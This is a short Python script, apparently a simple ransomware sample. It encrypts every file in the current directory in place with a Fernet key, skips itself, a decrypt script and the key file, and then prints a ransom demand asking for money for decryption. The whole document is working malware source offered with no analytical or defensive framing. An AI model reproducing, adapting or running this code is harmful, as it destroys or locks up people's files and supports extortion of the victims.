import os
from cryptography.fernet import Fernet

files = []
thisfile = "electro.py"
decryptfile = "decrypt.py"
keyfile = "key.key"
for file in os.listdir():
    if file == thisfile or file == decryptfile or file == keyfile:
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("key.key", "wb") as thekey:
    thekey.write(key)
    
for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypt = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypt)

print("Your data is encrypted. give us money for decryption _ badpepe _")